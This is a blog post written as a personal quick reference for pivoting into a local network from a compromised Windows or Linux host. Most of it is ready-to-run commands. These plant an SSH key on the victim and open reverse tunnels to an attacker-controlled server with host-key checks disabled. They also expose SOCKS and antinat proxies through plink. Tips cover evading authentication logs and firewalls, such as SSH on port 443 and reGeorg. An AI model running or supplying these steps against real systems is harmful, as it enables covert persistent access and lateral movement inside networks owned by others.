+++
date = "2018-11-20T00:00:00+00:00"
title = "Quick Windows and Linux LAN pivoting"
note = "When I wrote this many years ago, I often used it as a quick refernce. It is nothing exceptional, just your usual display of SSH as a server, VPN, proxy, router, etc :)"
toc = false
+++

## Principles

The idea is to execute a SOCKS5 server on the compromised target and forward the local port remotely via SSH.  
A remote server or any other means of exposing a port on the internet is required. When an SSH server is not available, [antinat](http://www.malsmith.net/antinat/) comes to the rescue.

## Linux

### Simpler

On your server:

{{< highlight bash >}}
useradd -m -s /bin/nologin targetname
ssh-keygen -t ecdsa -f /tmp/sshkey -q -N ""
mkdir /home/targetname/.ssh
cp /tmp/sshkey.pub /home/targetname/.ssh/authorized_keys
chown -R targetname:targetname /home/targetname/.ssh
chmod 600 /home/targetname/.ssh/authorized_keys
cat /tmp/sshkey
{{< /highlight >}}

Copy the content of `/tmp/sshkey`.

On the compromised host:

{{< highlight bash >}}
echo "my copied sshkey" >> /tmp/.keyfile
chmod 600 /tmp/.keyfile
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 22:127.0.0.1:2222 -i /tmp/.keyfile -fNT targetname@myserver
{{< /highlight >}}

Now on your server:

{{< highlight bash >}}
ssh -D 0.0.0.0:8080 compromiseduser@127.0.0.1 -p 2222 -fNT
{{< /highlight >}}

### Stealthier

We can combine the `antinat` proxy with the above procedure to avoid logging into the SSH server and thus writing to the authentication logs.

Instead of using the SOCKS options, upload the provided package and directly forward the `antinat` port:

{{< highlight cmd >}}
./antinat -cantinat.xml
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 0.0.0.0:32768:127.0.0.1:32768 -i /tmp/.keyfile -fNT targetname@myserver
{{< /highlight >}}

## Windows

Upload the package and extract it.

Start the `antinat` binary (no admin permissions required):

{{< highlight cmd >}}
antinat.exe -a -cC:\temp\antinat.xml
{{< /highlight >}}

Forward the `antinat` port with `plink`:

{{< highlight cmd >}}
echo y | plink -ssh -noagent -pw "wrongpassword" targetname@myserver
plink -ssh -noagent -C -T -N -pw "password" -R 0.0.0.0:32768:127.0.0.1:8080 targetname@myserver
{{< /highlight >}}

PuTTY natively supports SSH via HTTP, and so does `plink`, but it can only work via CLI if a preconfigured session already exists. [More info](https://superuser.com/questions/963563/is-it-possible-to-load-putty-connection-information-session-from-file).

## Tips

- Make SSH listen on port 443 to be less suspicious and bypass restrictive firewall rules.
- [Use corkscrew for SSH via HTTP Proxy](https://github.com/bryanpkc/corkscrew).
- [Use reGeorg to directly jump in DMZ backend servers](https://github.com/sensepost/reGeorg).